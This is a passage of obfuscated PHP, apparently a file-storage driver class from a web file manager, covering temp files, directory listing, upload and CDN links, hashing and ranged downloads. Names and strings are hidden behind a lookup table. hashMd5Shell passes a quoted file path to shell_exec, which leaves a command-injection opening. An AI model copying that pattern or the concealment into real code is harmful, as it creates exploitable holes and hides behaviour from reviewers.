tempFile($Ê‘¯∏Ø• = '', $≠œÙ¶®Õ = '') { if (!$Ê‘¯∏Ø•) { $Ê‘¯∏Ø• = rand_string(15); } $ôùπ¿ïÙ = TEMP_FILES . rand_string(15) . $_SERVER[ß⁄ˆÇ†Œ][8]; @mkdir($ôùπ¿ïÙ, DEFAULT_PERRMISSIONS, !0); $≥•íÌ¬˚ = $ôùπ¿ïÙ . $Ê‘¯∏Ø•; @touch($≥•íÌ¬˚); if ($≠œÙ¶®Õ) { file_put_contents($≥•íÌ¬˚, $≠œÙ¶®Õ); } return $≥•íÌ¬˚; } public function tempFileRemve($î÷¯‹‘Å) { @unlink($î÷¯‹‘Å); @rmdir($this->pathFather($î÷¯‹‘Å)); } public function mkfile($Û¬¬◊’⁄, $ÙÆÖë„µ = '', $⁄ÏÅ’«∂ = REPEAT_RENAME) { } public function mkdir($ßË¿˙óˆ, $ó˛üı§Å = REPEAT_SKIP) { } public function delFile($óÒö˜ﬁ£) { } public function delFolder($ïõ›É∞„) { } public function copyFile($·ù‡∫ïß, $ÖËì”Ïé) { } public function moveFile($›È–êÌ¸, $„óÑó¥ç) { } public function remove($Ÿ§Æ√’¸) { if ($this->isFile($Ÿ§Æ√’¸)) { return $this->delFile($Ÿ§Æ√’¸); } return $this->delFolder($Ÿ§Æ√’¸); } public function rename($¸¶í‘ÊÈ, $ÎÙ‘Ö¥¬) { } public function exist($ÜìèùöÁ) { } public function findByHash($Ñ‘ˆÏˆª = '', $‰üÄßΩÑ = '') { return !1; } public function isFile($ÚÖòæÖ¡) { } public function isFolder($»ÀñöÍÀ) { } public function size($¿øŒ§Ä¿) { } public function info($ü‹°ó´É) { } public function infoSimple($ô∑Ì€úﬁ) { return $this->info($ô∑Ì€úﬁ); } public function infoAuth($ÍΩÜ±Áº) { return $this->info($ÍΩÜ±Áº); } public function infoFull($ˆó≤ˆãœ) { return $this->info($ˆó≤ˆãœ); } public function infoFullSimple($Å°êÕªÑ) { return $this->info($Å°êÕªÑ); } public function infoWithChildren($Ûç—£ﬂÁ) { $¡ÌâÒÌ« =& $_SERVER[ß⁄ˆÇ†Œ]; static $Ø⁄®”÷É = array(); if (isset($Ø⁄®”÷É[$Ûç—£ﬂÁ])) { return $Ø⁄®”÷É[$Ûç—£ﬂÁ]; } $Ë¨ßÎâ∏ = $this->info($Ûç—£ﬂÁ); if ($Ë¨ßÎâ∏ && $Ë¨ßÎâ∏[$¡ÌâÒÌ«[33]] == $¡ÌâÒÌ«[78]) { $é∑ıüÂª = array($¡ÌâÒÌ«[79] => 0, $¡ÌâÒÌ«[80] => 0, $¡ÌâÒÌ«[81] => 0); $this->infoChildren($Ûç—£ﬂÁ, $é∑ıüÂª); $Ë¨ßÎâ∏[$¡ÌâÒÌ«[79]] = $é∑ıüÂª[$¡ÌâÒÌ«[79]]; $Ë¨ßÎâ∏[$¡ÌâÒÌ«[82]] = array($¡ÌâÒÌ«[83] => $é∑ıüÂª[$¡ÌâÒÌ«[80]], $¡ÌâÒÌ«[84] => $é∑ıüÂª[$¡ÌâÒÌ«[81]]); $Ø⁄®”÷É[$Ûç—£ﬂÁ] = $Ë¨ßÎâ∏; } return $Ë¨ßÎâ∏; } public function listPath($Æ®ùõ¬Œ, $—ÎÄÕûÓ = false) { } public function has($•ﬂ˘´–ú, $™ºòÄ Ÿ = false, $¿ÉŒîê◊ = false) { } public function canRead($è˘Èõíû) { } public function canWrite($◊˘è∆ÖÃ) { } public function getContent($á™âÚÅà) { } public function setContent($Ì∫®ª¿¿, $ïŒÖØ†√ = '') { } protected function infoChildren($±Ë˘Ü⁄ˆ, &$Œ“‡Æåœ) { $˘Î≠‚≠° =& $_SERVER[ß⁄ˆÇ†Œ]; check_abort_echo(); $ãæ≤©˝ó = $this->listPath($±Ë˘Ü⁄ˆ, !0); $ãæ≤©˝ó = array_merge($ãæ≤©˝ó[$˘Î≠‚≠°[85]], $ãæ≤©˝ó[$˘Î≠‚≠°[86]]); foreach ($ãæ≤©˝ó as $¡∫Å—˜Ç) { if ($¡∫Å—˜Ç[$˘Î≠‚≠°[33]] == $˘Î≠‚≠°[78]) { $Œ“‡Æåœ[$˘Î≠‚≠°[81]]++; $¬∑˙û⁄º = $this->getPathInner($¡∫Å—˜Ç[$˘Î≠‚≠°[87]]); $this->infoChildren($¬∑˙û⁄º, $Œ“‡Æåœ); } else { $Œ“‡Æåœ[$˘Î≠‚≠°[80]]++; $Œ“‡Æåœ[$˘Î≠‚≠°[79]] += $¡∫Å—˜Ç[$˘Î≠‚≠°[79]]; } } } public function fileSubstr($œ–î∑‘˝, $ÓÚÚ¿ÆÆ, $¡à÷‡ÊÇ) { } public function listAll($çü‚·œ„) { } public function listAllMake($≤¡®πÃá, &$¶˝¶’Ïò) { $ñÎ£¿‘≠ =& $_SERVER[ß⁄ˆÇ†Œ]; check_abort_echo(); $Úô·’õ = $this->listPath($≤¡®πÃá, !0); if (!$Úô·’õ) { return; } $ﬂ«ÒÊ€’ = array_merge($Úô·’õ[$ñÎ£¿‘≠[85]], $Úô·’õ[$ñÎ£¿‘≠[86]]); foreach ($ﬂ«ÒÊ€’ as $µâò∞˙) { $ÀÜ¡È˛® = $µâò∞˙[$ñÎ£¿‘≠[33]] == $ñÎ£¿‘≠[78]; $ûöÂöÜó = array($ñÎ£¿‘≠[87] => $µâò∞˙[$ñÎ£¿‘≠[87]], $ñÎ£¿‘≠[78] => $ÀÜ¡È˛®); if (isset($µâò∞˙[$ñÎ£¿‘≠[79]])) { $ûöÂöÜó[$ñÎ£¿‘≠[79]] = $µâò∞˙[$ñÎ£¿‘≠[79]]; } if (isset($µâò∞˙[$ñÎ£¿‘≠[88]])) { $ûöÂöÜó[$ñÎ£¿‘≠[88]] = $µâò∞˙[$ñÎ£¿‘≠[88]]; } if (!$ÀÜ¡È˛®) { $¶˝¶’Ïò[] = $ûöÂöÜó; continue; } $¶˝¶’Ïò[] = $ûöÂöÜó; $‘Ïªﬂõ∫ = $µâò∞˙[$ñÎ£¿‘≠[87]]; $òÇÀ√Üñ = $this->pathDriver; if (substr($µâò∞˙[$ñÎ£¿‘≠[87]], 0, strlen($òÇÀ√Üñ)) == $òÇÀ√Üñ) { $‘Ïªﬂõ∫ = substr($‘Ïªﬂõ∫, strlen($òÇÀ√Üñ)); } $this->listAllMake($‘Ïªﬂõ∫, $¶˝¶’Ïò); } } public function listAllSimple($˚©ÆÆ›Á, $¨©¯Ö¬˜ = false) { $√É≈÷“’ = $this->listAll($˚©ÆÆ›Á); return $this->listAllSimpleMake($√É≈÷“’, $this->getPathOuter($˚©ÆÆ›Á), $¨©¯Ö¬˜); } public function listAllSimpleMake($Ü¬∆À˛ï, $»Å¿§å¸, $˘âæ≈à¶) { $ññã£®Ò =& $_SERVER[ß⁄ˆÇ†Œ]; $˙€⁄◊Ó˙ = array(); $»Å¿§å¸ = rtrim(get_path_father($»Å¿§å¸), $ññã£®Ò[8]) . $ññã£®Ò[8]; foreach ($Ü¬∆À˛ï as $ìÒÎ‡†Ã) { $Îòùøñ‰ = array($ññã£®Ò[87] => $ìÒÎ‡†Ã[$ññã£®Ò[87]], $ññã£®Ò[89] => $ìÒÎ‡†Ã[$ññã£®Ò[87]], $ññã£®Ò[78] => $ìÒÎ‡†Ã[$ññã£®Ò[78]]); if (isset($ìÒÎ‡†Ã[$ññã£®Ò[79]]) && !$ìÒÎ‡†Ã[$ññã£®Ò[78]]) { $Îòùøñ‰[$ññã£®Ò[79]] = $ìÒÎ‡†Ã[$ññã£®Ò[79]]; } if (isset($ìÒÎ‡†Ã[$ññã£®Ò[88]])) { $Îòùøñ‰[$ññã£®Ò[88]] = $ìÒÎ‡†Ã[$ññã£®Ò[88]]; } if (is_array($ìÒÎ‡†Ã[$ññã£®Ò[90]])) { $Îòùøñ‰[$ññã£®Ò[89]] = $ìÒÎ‡†Ã[$ññã£®Ò[90]][$ññã£®Ò[87]]; $Îòùøñ‰[$ññã£®Ò[79]] = $ìÒÎ‡†Ã[$ññã£®Ò[90]][$ññã£®Ò[79]]; $Îòùøñ‰[$ññã£®Ò[88]] = $ìÒÎ‡†Ã[$ññã£®Ò[90]][$ññã£®Ò[88]]; } else { if (substr($ìÒÎ‡†Ã[$ññã£®Ò[87]], 0, strlen($»Å¿§å¸)) == $»Å¿§å¸) { $Îòùøñ‰[$ññã£®Ò[87]] = substr($ìÒÎ‡†Ã[$ññã£®Ò[87]], strlen($»Å¿§å¸)); } } $§Ãº∂ÂË = $ìÒÎ‡†Ã[$ññã£®Ò[78]] ? $ññã£®Ò[8] : $ññã£®Ò[12]; $Îòùøñ‰[$ññã£®Ò[89]] = rtrim($Îòùøñ‰[$ññã£®Ò[89]], $ññã£®Ò[8]) . $§Ãº∂ÂË; $Îòùøñ‰[$ññã£®Ò[87]] = $ññã£®Ò[8] . trim($Îòùøñ‰[$ññã£®Ò[87]], $ññã£®Ò[8]) . $§Ãº∂ÂË; if (!$˘âæ≈à¶) { $·∏◊Óò› = explode($ññã£®Ò[8], trim($Îòùøñ‰[$ññã£®Ò[87]], $ññã£®Ò[8])); $Îòùøñ‰[$ññã£®Ò[87]] = $ññã£®Ò[8] . implode($ññã£®Ò[8], array_slice($·∏◊Óò›, 1)) . $§Ãº∂ÂË; } $˙€⁄◊Ó˙[] = $Îòùøñ‰; } return array_sort_by($˙€⁄◊Ó˙, $ññã£®Ò[87]); } public function upload($ÏÂíÆÍÉ, $æÃÔÕ¢¶, $Ø¸êú≠Ò = false, $ˆÕÖ‹ÕË = REPEAT_REPLACE) { } public function uploadFileByID($¶Ó∏¢€â, $ÜïãÑ÷À, $ò™•≠˚¯) { } public function uploadFileByPath($“›ƒêõ±, $ÉÈ˝∑∂Ì, $òï’é˛€ = array()) { } public function isUploadServer() { $ÌŒ‘¡ﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÌŒ‘¡ﬂ[91]) { return !0; } return $GLOBALS[$ÌŒ‘¡ﬂ[6]][$ÌŒ‘¡ﬂ[92]][$ÌŒ‘¡ﬂ[93]]; } public function isFileOutServer() { $˛êè’Ïú =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $˛êè’Ïú[91]) { return !0; } return $GLOBALS[$˛êè’Ïú[6]][$˛êè’Ïú[92]][$˛êè’Ïú[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($âªÖá∆”) { $Ú˘¯ˆÿ‚ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->isCdnHost()) { return $âªÖá∆”; } return str_replace(trim(get_url_root($âªÖá∆”), $Ú˘¯ˆÿ‚[8]), trim($this->cdnHost, $Ú˘¯ˆÿ‚[8]), $âªÖá∆”); } public function uploadLink($”î¸≈ï, $∞∑ºû¨À = 0) { $ûßé∆≈‚ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->isUploadServer()) { return; } $á˚∫ºΩ = $this->getType(); if (!in_array($á˚∫ºΩ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ú‰¡´ß™ = 1024 * 1024 * 10; $˘ß´ç˛ˆ = $∞∑ºû¨À <= $Ú‰¡´ß™ ? $ûßé∆≈‚[95] : $ûßé∆≈‚[96]; $Ø¥Œ¬Ωë = (!$∞∑ºû¨À ? 1 : ceil($∞∑ºû¨À / pow(1024, 3))) * 3600 * 4; $Ì◊¬è–© = $this->{$˘ß´ç˛ˆ}($”î¸≈ï, $Ø¥Œ¬Ωë); if ($Ì◊¬è–©) { $Ì◊¬è–©[$ûßé∆≈‚[97]] = $”î¸≈ï; $Ì◊¬è–©[$ûßé∆≈‚[98]] = $á˚∫ºΩ; } return $Ì◊¬è–©; } public function uploadFormData($”··‡◊‚, $ê‡·†±ù = 3600) { } public function multiUploadFormData($ÚÍú≤´©, $Ãìº±ó∂ = 3600) { } public function download($ç¸™ÇèÌ, $¢€◊á˚Ï) { } public function ext($…ÚñÔï∂) { $“ﬂºÄôÂ =& $_SERVER[ß⁄ˆÇ†Œ]; if (strpos($…ÚñÔï∂, $“ﬂºÄôÂ[8]) === -1) { $¡“òóì¡ = $…ÚñÔï∂; } else { $¡“òóì¡ = $this->pathThis($…ÚñÔï∂); } $ºòáÃñæ = $“ﬂºÄôÂ[12]; if (strstr($¡“òóì¡, $“ﬂºÄôÂ[10])) { $ºòáÃñæ = substr($¡“òóì¡, strrpos($¡“òóì¡, $“ﬂºÄôÂ[10]) + 1); $ºòáÃñæ = strtolower($ºòáÃñæ); } if (strlen($ºòáÃñæ) > 3 && preg_match($“ﬂºÄôÂ[99], $ºòáÃñæ, $† ∞Ó¶Ã)) { $ºòáÃñæ = $“ﬂºÄôÂ[12]; } return $ºòáÃñæ; } public function pathThis($ïÜô±”≥) { $˚êï¿î® =& $_SERVER[ß⁄ˆÇ†Œ]; $ïÜô±”≥ = str_replace($˚êï¿î®[100], $˚êï¿î®[8], rtrim($ïÜô±”≥, $˚êï¿î®[8])); $∆õ¡íÍ≤ = strrpos($ïÜô±”≥, $˚êï¿î®[8]); if ($∆õ¡íÍ≤ === !1) { return $ïÜô±”≥; } return substr($ïÜô±”≥, $∆õ¡íÍ≤ + 1); } public function pathFather($¬ò˚á¡ù) { $…œãˆ≈“ =& $_SERVER[ß⁄ˆÇ†Œ]; $¬ò˚á¡ù = str_replace($…œãˆ≈“[100], $…œãˆ≈“[8], rtrim($¬ò˚á¡ù, $…œãˆ≈“[8])); $æâîàÑ© = strrpos($¬ò˚á¡ù, $…œãˆ≈“[8]); if ($æâîàÑ© === !1) { return $…œãˆ≈“[12]; } return substr($¬ò˚á¡ù, 0, $æâîàÑ© + 1); } public function hashSimple($Í•‰ì™˜) { $Ó˛÷Èﬂ˛ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Í•‰ì™˜) { return md5($Ó˛÷Èﬂ˛[12]); } $Ôî†ò¸¨ = $this->size($Í•‰ì™˜); $âÉÎÅ≥… = 200; $™≠‡óÏ = 50; if ($Ôî†ò¸¨ <= $âÉÎÅ≥… * $™≠‡óÏ) { return $this->hashMd5($Í•‰ì™˜) . $Ôî†ò¸¨; } $Ï¶è∞Ö◊ = intval($Ôî†ò¸¨ / $™≠‡óÏ); $§¯˛˝Øú = $Ó˛÷Èﬂ˛[12]; for ($Ω≠·º¸Õ = 0; $Ω≠·º¸Õ < $™≠‡óÏ; $Ω≠·º¸Õ++) { $§¯˛˝Øú .= $this->fileSubstr($Í•‰ì™˜, $Ï¶è∞Ö◊ * $Ω≠·º¸Õ, $âÉÎÅ≥…); } $§¯˛˝Øú .= $this->fileSubstr($Í•‰ì™˜, $Ôî†ò¸¨ - $âÉÎÅ≥…, $âÉÎÅ≥…); return md5($§¯˛˝Øú) . $Ôî†ò¸¨; } public static $md5Cache = array(); public function hashMd5($∏‰”ûÎ») { if (!$∏‰”ûÎ») { return md5($_SERVER[ß⁄ˆÇ†Œ][12]); } $∏‰”ûÎ» = $this->iconvSystem($∏‰”ûÎ»); if (isset(self::$md5Cache[$∏‰”ûÎ»])) { return self::$md5Cache[$∏‰”ûÎ»]; } self::$md5Cache[$∏‰”ûÎ»] = $this->hashMd5Shell($∏‰”ûÎ»); if (!self::$md5Cache[$∏‰”ûÎ»]) { self::$md5Cache[$∏‰”ûÎ»] = @md5_file($∏‰”ûÎ»); } return self::$md5Cache[$∏‰”ûÎ»]; } private function hashMd5Shell($¨¨©ï™Ù) { $Í∫Ê¡äè =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$¨¨©ï™Ù) { return md5($Í∫Ê¡äè[12]); } if (!function_exists($Í∫Ê¡äè[101])) { return !1; } $ª’Í≠ä⁄ = array($Í∫Ê¡äè[102], $Í∫Ê¡äè[103]); $ÛÄëÒ¸˙ = Cache::get($Í∫Ê¡äè[104]); if (!$ÛÄëÒ¸˙) { $ÁÚå—›Ä = BASIC_PATH . $Í∫Ê¡äè[105]; $·ƒ∆√ô£ = md5_file($ÁÚå—›Ä); $ÛÄëÒ¸˙ = $Í∫Ê¡äè[106]; foreach ($ª’Í≠ä⁄ as $ı™∞ÌÆí) { $¯ ˚ïó› = shell_exec($ı™∞ÌÆí . "\x20\42{$ÁÚå—›Ä}\42"); if ($¯ ˚ïó› && substr(trim($¯ ˚ïó›), 0, 32) == $·ƒ∆√ô£) { $ÛÄëÒ¸˙ = $ı™∞ÌÆí; break; } } Cache::set($Í∫Ê¡äè[104], $ÛÄëÒ¸˙, 3600); } if ($ÛÄëÒ¸˙ == $Í∫Ê¡äè[106]) { return !1; } $¯ ˚ïó› = shell_exec($ÛÄëÒ¸˙ . "\x20\42{$¨¨©ï™Ù}\42"); $¯ ˚ïó› = str_replace($Í∫Ê¡äè[107], $Í∫Ê¡äè[12], $¯ ˚ïó›); return substr($¯ ˚ïó›, 0, 32); } public function link($‚∏µ€≈˜) { return $‚∏µ€≈˜; } public function fileOut($›É’‚ƒ“, $ñ°„§ü¡ = false, $È™ﬁ˘… = false, $ïÊÑ˘—¨ = '') { $ÿÙ¬Çä¿ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->cacheMethod(null, null); if (!$›É’‚ƒ“ || !$this->exist($›É’‚ƒ“)) { show_json(LNG($ÿÙ¬Çä¿[108]), !1, $È™ﬁ˘…); } $øÜ´ÎÑé = $this->getType() == $ÿÙ¬Çä¿[109]; $∑∑ìæÌâ = $GLOBALS[$ÿÙ¬Çä¿[6]][$ÿÙ¬Çä¿[92]][$ÿÙ¬Çä¿[110]][$ÿÙ¬Çä¿[111]]; $·¯∂È∏› = (double) $GLOBALS[$ÿÙ¬Çä¿[6]][$ÿÙ¬Çä¿[92]][$ÿÙ¬Çä¿[110]][$ÿÙ¬Çä¿[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ƒ˙∑Ù‚ = $this->infoFull($›É’‚ƒ“); $ñ…ú€Î“ = $ƒ˙∑Ù‚[$ÿÙ¬Çä¿[79]]; $˘√‚ƒä˝ = gmdate($ÿÙ¬Çä¿[113], $ƒ˙∑Ù‚[$ÿÙ¬Çä¿[88]]); $ª«Ä¥á = $È™ﬁ˘… ? $È™ﬁ˘… : $this->iconvApp($ƒ˙∑Ù‚[$ÿÙ¬Çä¿[32]]); $ãÏâ‘«¿ = 0; $º•®≠éª = $ñ…ú€Î“ - 1; $∫Ç∂ÓË© = $this->ext($ª«Ä¥á); if (in_array($∫Ç∂ÓË©, array($ÿÙ¬Çä¿[114], $ÿÙ¬Çä¿[115], $ÿÙ¬Çä¿[116], $ÿÙ¬Çä¿[117]))) { $∫Ç∂ÓË© = $ÿÙ¬Çä¿[118]; } if (in_array($∫Ç∂ÓË©, array($ÿÙ¬Çä¿[119]))) { $∫Ç∂ÓË© = $ÿÙ¬Çä¿[120]; } if (!$ïÊÑ˘—¨) { $ïÊÑ˘—¨ = md5($˘√‚ƒä˝ . $ñ…ú€Î“); } $ïÊÑ˘—¨ = $ÿÙ¬Çä¿[121] . $ïÊÑ˘—¨ . $ÿÙ¬Çä¿[121]; $“Éá…÷≠ = get_file_mime($∫Ç∂ÓË©); $îŒƒí§¯ = !0; $îŒƒí§¯ = isset($_GET[$ÿÙ¬Çä¿[122]]) ? !1 : !0; if ($ñ°„§ü¡ === !1 && !mime_support($“Éá…÷≠)) { $“Éá…÷≠ = $ÿÙ¬Çä¿[123]; } header($ÿÙ¬Çä¿[124]); header($ÿÙ¬Çä¿[125] . $“Éá…÷≠); $Ø⁄è˙éÇ = rawurlencode($ª«Ä¥á); $Ø⁄è˙éÇ = $ÿÙ¬Çä¿[121] . $Ø⁄è˙éÇ . $ÿÙ¬Çä¿[126] . $Ø⁄è˙éÇ; if ($ñ°„§ü¡) { header($ÿÙ¬Çä¿[127]); header($ÿÙ¬Çä¿[128] . $Ø⁄è˙éÇ); } else { if ($îŒƒí§¯) { header($ÿÙ¬Çä¿[129] . $Ø⁄è˙éÇ); } } $µÃ»Ü˚î = 3600 * 24 * 30; header($ÿÙ¬Çä¿[130]); header($ÿÙ¬Çä¿[131]); header($ÿÙ¬Çä¿[132] . $µÃ»Ü˚î); header($ÿÙ¬Çä¿[133] . gmdate($ÿÙ¬Çä¿[113], time() + $µÃ»Ü˚î) . $ÿÙ¬Çä¿[134]); if (isset($_SERVER[$ÿÙ¬Çä¿[135]]) && strtotime($_SERVER[$ÿÙ¬Çä¿[135]]) == $ƒ˙∑Ù‚[$ÿÙ¬Çä¿[88]]) { header($ÿÙ¬Çä¿[136], !0, 304); die; } if (isset($_SERVER[$ÿÙ¬Çä¿[137]]) && $_SERVER[$ÿÙ¬Çä¿[137]] == $ïÊÑ˘—¨) { header($ÿÙ¬Çä¿[138] . $ïÊÑ˘—¨, !0, 304); die; } header($ÿÙ¬Çä¿[138] . $ïÊÑ˘—¨); header($ÿÙ¬Çä¿[139] . $˘√‚ƒä˝ . $ÿÙ¬Çä¿[134]); header($ÿÙ¬Çä¿[140] . $ª«Ä¥á); header($ÿÙ¬Çä¿[141]); header($ÿÙ¬Çä¿[142] . $ñ…ú€Î“); header($ÿÙ¬Çä¿[143]); Hook::trigger($ÿÙ¬Çä¿[144], $›É’‚ƒ“, $ñ…ú€Î“, $ª«Ä¥á, $∫Ç∂ÓË©); if (!$ñ°„§ü¡ && $∫Ç∂ÓË© == $ÿÙ¬Çä¿[145]) { if ($ñ…ú€Î“ > 1024 * 1024 * 5) { die; } $Æ›ûó∏ü = $this->getContent($›É’‚ƒ“); $Æ›ûó∏ü = Html::clearSVG($Æ›ûó∏ü); header($ÿÙ¬Çä¿[146] . strlen($Æ›ûó∏ü)); echo $Æ›ûó∏ü; die; } $æáÁﬁ»Å = strtolower($_SERVER[$ÿÙ¬Çä¿[147]]); if ($øÜ´ÎÑé && $æáÁﬁ»Å && $∑∑ìæÌâ) { if (strstr($æáÁﬁ»Å, $ÿÙ¬Çä¿[148])) { header($ÿÙ¬Çä¿[149] . $›É’‚ƒ“); } else { if (strstr($æáÁﬁ»Å, $ÿÙ¬Çä¿[150])) { header($ÿÙ¬Çä¿[151] . $›É’‚ƒ“); } else { if (strstr($æáÁﬁ»Å, $ÿÙ¬Çä¿[152])) { header($ÿÙ¬Çä¿[153] . $›É’‚ƒ“); } } } if ($·¯∂È∏›) { header($ÿÙ¬Çä¿[154] . $·¯∂È∏›); } return; } if (isset($_SERVER[$ÿÙ¬Çä¿[155]])) { if (preg_match($ÿÙ¬Çä¿[156], $_SERVER[$ÿÙ¬Çä¿[155]], $ûÑØ¿ëª)) { $ãÏâ‘«¿ = intval($ûÑØ¿ëª[1]); $ãÏâ‘«¿ = $ãÏâ‘«¿ <= 0 ? 0 : ($ãÏâ‘«¿ >= $º•®≠éª ? $º•®≠éª : $ãÏâ‘«¿); if (!empty($ûÑØ¿ëª[2])) { $úÊ¡–ﬂ† = intval($ûÑØ¿ëª[2]); $º•®≠éª = $úÊ¡–ﬂ† < $ãÏâ‘«¿ ? $ãÏâ‘«¿ : ($úÊ¡–ﬂ† >= $º•®≠éª ? $º•®≠éª : $úÊ¡–ﬂ†); } } header($ÿÙ¬Çä¿[157]); header("\x43\x6f\156\164\x65\x6e\164\55\122\x61\x6e\x67\x65\72\40\x62\171\x74\x65\x73\40{$ãÏâ‘«¿}\55{$º•®≠éª}\57" . $ñ…ú€Î“); } else { header($ÿÙ¬Çä¿[158]); } header($ÿÙ¬Çä¿[159]); header($ÿÙ¬Çä¿[160]); $‹—“êõ∂ = !0; if ($_SERVER[$ÿÙ¬Çä¿[161]] == $ÿÙ¬Çä¿[162] && $ñ…ú€Î“ > 1204 * 1024 * 1024 * 2) { $‹—“êõ∂ = !1; } if ($‹—“êõ∂) { header($ÿÙ¬Çä¿[163] . ($º•®≠éª - $ãÏâ‘«¿ + 1)); } if ($_SERVER[$ÿÙ¬Çä¿[164]] == $ÿÙ¬Çä¿[165]) { return; } $ÌÕ∑î¿¯ = array($ÿÙ¬Çä¿[166] => !1, $ÿÙ¬Çä¿[167] => $ãÏâ‘«¿, $ÿÙ¬Çä¿[168] => $º•®≠éª, $ÿÙ¬Çä¿[169] => $∫Ç∂ÓË©, $ÿÙ¬Çä¿[170] => $ƒ˙∑Ù‚, $ÿÙ¬Çä¿[171] => $ÿÙ¬Çä¿[12], $ÿÙ¬Çä¿[172] => 0); $ÌÕ∑î¿¯ = Hook::filter($ÿÙ¬Çä¿[173], $ÌÕ∑î¿¯); $¿øÿ€¯¡ = 1024 * 300; $ÇàÈßÒÿ = 0; if ($·¯∂È∏›) { $ÇàÈßÒÿ = intval(1000 * 1000 * ($¿øÿ€¯¡ / $·¯∂È∏›)); } while ($ãÏâ‘«¿ <= $º•®≠éª) { $Ú‹£ÉÛû = timeFloat(); check_abort(); $≈–Ù√Öé = $º•®≠éª - $ãÏâ‘«¿ + 1; if ($≈–Ù√Öé <= $¿øÿ€¯¡) { $¿øÿ€¯¡ = $≈–Ù√Öé; } $Æ›ûó∏ü = $this->fileSubstr($›É’‚ƒ“, $ãÏâ‘«¿, $¿øÿ€¯¡); if ($ÌÕ∑î¿¯[$ÿÙ¬Çä¿[166]]) { $ÌÕ∑î¿¯[$ÿÙ¬Çä¿[171]] = $Æ›ûó∏ü; $ÌÕ∑î¿¯[$ÿÙ¬Çä¿[172]] = $ãÏâ‘«¿; $ÌÕ∑î¿¯ = Hook::filter($ÿÙ¬Çä¿[174], $ÌÕ∑î¿¯); $Æ›ûó∏ü = $ÌÕ∑î¿¯[$ÿÙ¬Çä¿[171]]; } echo $Æ›ûó∏ü; $ãÏâ‘«¿ += $¿øÿ€¯¡; if ($¿øÿ€¯¡ == $≈–Ù√Öé) { $ãÏâ‘«¿ = $º•®≠éª + 1; } if ($ÇàÈßÒÿ) { $˝¢äË≥Ã = intval(1000 * 1000 * (timeFloat() - $Ú‹£ÉÛû)); $µÚ˚Ûç† = $ÇàÈßÒÿ - $˝¢äË≥Ã; if ($µÚ˚Ûç† > 5) { usleep($µÚ˚Ûç†); } } } } public function fileOutServer($∂ëí√ÔØ, $π±†€∂„ = false, $Æ•æªÍº = false, $ Í–Å©è = '') { $this->fileOut($∂ëí√ÔØ, $π±†€∂„, $Æ•æªÍº, $ Í–Å©è); } public function fileOutLink($ˆáÂ∏ˆΩ) { header($_SERVER[ß⁄ˆÇ†Œ][175] . $ˆáÂ∏ˆΩ); die; } public function cacheMethod($Ù—ãï≠¸, $í≈ªâ˝Ü, $∫Â·ˆΩû = null) { $è⁄Ω›¨ò =& $_SERVER[ß⁄ˆÇ†Œ]; static $â˜˘·¶Ï = array(); $ÔÜ≤à≠É = $í≈ªâ˝Ü ? ltrim($this->getPathOuter($í≈ªâ˝Ü), $è⁄Ω›¨ò[8]) : $è⁄Ω›¨ò[12]; $ä ÏÁâ“ = $è⁄Ω›¨ò[176] . $Ù—ãï≠¸ . $è⁄Ω›¨ò[177] . rtrim($ÔÜ≤à≠É, $è⁄Ω›¨ò[8]); if (is_null($Ù—ãï≠¸)) { $â˜˘·¶Ï = array(); return; } if (is_null($í≈ªâ˝Ü)) { foreach ($â˜˘·¶Ï as $ä ÏÁâ“ => $Í¶œ–ª) { if (!strstr($ä ÏÁâ“, $è⁄Ω›¨ò[176] . $Ù—ãï≠¸ . $è⁄Ω›¨ò[178])) { continue; } unset($â˜˘·¶Ï[$ä ÏÁâ“]); } return; } if (!is_null($∫Â·ˆΩû)) { $â˜˘·¶Ï[$ä ÏÁâ“] = $∫Â·ˆΩû; return; } $ä·öÚ¿Æ = isset($â˜˘·¶Ï[$ä ÏÁâ“]) ? $â˜˘·¶Ï[$ä ÏÁâ“] : null; if (!is_null($ä·öÚ¿Æ)) { return $ä·öÚ¿Æ; } $ä·öÚ¿Æ = $this->{$Ù—ãï≠¸}($í≈ªâ˝Ü); $â˜˘·¶Ï[$ä ÏÁâ“] = $ä·öÚ¿Æ; return $ä·öÚ¿Æ; } public function cacheMethodInfoSet($‰ƒµîõå, $·µÔÎ≠ô, $Áæ„⁄å¨ = false) { $Ó∆Û–¡Æ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ó∆Û–¡Æ[179], $‰ƒµîõå, $·µÔÎ≠ô); $this->cacheMethod($Ó∆Û–¡Æ[180], $‰ƒµîõå, $·µÔÎ≠ô ? !1 : !0); if (is_array($Áæ„⁄å¨)) { $this->cacheMethod($Ó∆Û–¡Æ[181], $‰ƒµîõå, $Áæ„⁄å¨); } } public function fileOutImage($¨˛™å†Ë, $„˝ˆ≠Ò´ = 250) { $¥≥≥˛¯Î =& $_SERVER[ß⁄ˆÇ†Œ]; set_timeout(); if (substr($¨˛™å†Ë, 0, 4) == $¥≥≥˛¯Î[152]) { $this->fileOutLink($¨˛™å†Ë); } $·˝Õ◊˝Ã = $this->info($¨˛™å†Ë); $µ∏™´ä∆ = !1; $∞˜À‘©Á = isset($GLOBALS[$¥≥≥˛¯Î[182]]) ? $GLOBALS[$¥≥≥˛¯Î[182]] : array(); if ($∞˜À‘©Á && $∞˜À‘©Á[$¥≥≥˛¯Î[183]] == $·˝Õ◊˝Ã[$¥≥≥˛¯Î[87]]) { $·˝Õ◊˝Ã = $∞˜À‘©Á; $“ÉÕÙ¸Ä = $·˝Õ◊˝Ã[$¥≥≥˛¯Î[184]]; if ($“ÉÕÙ¸Ä && isset($“ÉÕÙ¸Ä[$¥≥≥˛¯Î[185]])) { if ($“ÉÕÙ¸Ä[$¥≥≥˛¯Î[185]] <= $„˝ˆ≠Ò´ && $“ÉÕÙ¸Ä[$¥≥≥˛¯Î[186]] <= $„˝ˆ≠Ò´) { $µ∏™´ä∆ = !0; } } } if 